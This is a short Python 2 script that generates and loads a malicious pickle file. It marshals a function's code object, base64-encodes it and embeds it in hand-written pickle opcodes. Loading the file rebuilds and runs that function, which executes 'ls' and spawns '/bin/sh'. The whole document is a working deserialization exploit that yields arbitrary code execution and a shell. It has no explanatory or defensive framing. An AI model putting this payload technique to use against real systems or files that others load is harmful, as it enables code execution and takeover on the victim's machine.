import marshal
import base64
import os
import pickle

def foo():
	import os
	print "Hola!"
	os.system("ls")
	os.system("/bin/sh")
	pass # Your code here

content = """ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR.""" % base64.b64encode(marshal.dumps(foo.func_code))

filename = "new.pickle"
print "Saved to: \n%s" % (filename)
text_file = open(filename, "w")
text_file.write(content)
text_file.close()

print "Executed:"
pickle.load(open(filename))
